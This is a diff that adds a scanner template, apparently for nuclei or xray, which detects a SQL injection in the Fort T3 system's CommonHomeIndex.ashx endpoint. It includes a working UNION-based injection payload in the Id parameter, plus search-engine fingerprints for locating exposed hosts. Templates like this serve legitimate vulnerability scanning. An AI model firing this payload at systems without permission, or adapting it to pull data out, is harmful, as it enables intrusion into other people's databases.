@@ -1,0 +1,34 @@
+id: poc-yaml-fort-t3-system-commonhomeindex-sqli
+info:
+  name: Fort T3 System CommonHomeIndex SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: Fort T3
+    fofa:
+      - body="/mlogin.htm?url="
+      - body="T3/MAIN/Login.aspx"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/FRAME/CommonHomeIndex.ashx?action=getdeptpersonList&Id=%27%20UNION%20ALL%20SELECT%20NULL%2Csys.fn_varbintohexstr%28hashbytes%28'MD5','{{t1}}'%29%29%2CNULL%2CNULL%2CNULL--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "checkbox2"
+          - "CheckAllLineYuanGong"
+          - "0x{{t2}}"
+      - type: word
+        words:
+          - "<html"
+        negative: true
